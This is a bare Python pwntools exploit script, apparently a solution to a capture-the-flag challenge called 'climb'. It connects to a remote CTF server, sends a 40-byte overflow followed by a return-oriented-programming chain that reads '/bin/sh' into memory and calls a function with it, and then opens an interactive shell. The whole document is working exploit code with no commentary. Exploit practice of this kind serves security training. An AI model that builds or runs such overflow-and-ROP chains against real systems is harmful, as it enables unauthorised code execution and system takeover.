from pwn import *
import time
#target=process('./climb')
target=remote('cha.hackpack.club' ,41702)
print(target.recvuntil("respond? "))
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="b *0x4006D4")

callme=0x400664
ret=0x4004fe
poprdi=0x400743
poprsir15=0x400741
poprdx=0x400654
readplt=0x400550
writeaddr=0x6010a0

payload="A"*40
payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(0)
payload+=p64(poprsir15)
payload+=p64(writeaddr)
payload+=p64(0xcafebabe)
payload+=p64(poprdx)
payload+=p64(0x8)
payload+=p64(readplt)
payload+=p64(poprdi)
payload+=p64(writeaddr)
payload+=p64(callme)


target.sendline(payload)
time.sleep(1)
target.sendline("/bin/sh\x00")
target.sendline("/bin/sh\x00")
target.sendline("/bin/sh\x00")
target.sendline("/bin/sh\x00")

target.interactive()
